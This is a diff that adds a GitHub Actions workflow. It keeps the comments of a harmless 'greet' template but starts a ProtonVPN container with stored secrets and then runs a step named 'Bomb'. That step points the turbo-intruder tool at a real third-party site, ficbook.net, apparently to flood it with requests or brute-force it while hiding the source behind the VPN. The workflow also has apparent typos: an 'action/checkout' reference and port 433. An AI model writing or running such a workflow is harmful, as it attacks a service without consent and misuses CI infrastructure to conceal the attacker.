@@ -1,0 +1,38 @@
+# This is a basic workflow that is manually triggered
+
+name: Manual workflow
+
+# Controls when the action will run. Workflow runs when manually triggered using the UI
+# or API.
+on:
+  workflow_dispatch:
+  push:
+  
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "greet"
+  greet:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+    - name: Copy
+      uses: action/checkout@v3
+    - name: Get Docker
+      run: |
+        docker pull ghcr.io/tprasadtp/protonvpn:latest
+        docker run \
+        --rm \
+        --detach \
+        --name=protonvpn \
+        --device=/dev/net/tun \
+        --cap-add=NET_ADMIN \
+        --env PROTONVPN_USERNAME=${{secrets.OPENVPNN}} \
+        --env PROTONVPN_PASSWORD=${{secrets.OPENVPNP}} \
+        --env PROTONVPN_TIER=0 \
+        --env PROTONVPN_SERVER=NL \
+        ghcr.io/tprasadtp/protonvpn:latest
+    - name: Bomb
+      run: java -jar turbo-intruder-all.jar beta/script.py beta/req.txt https://ficbook.net:433 foo
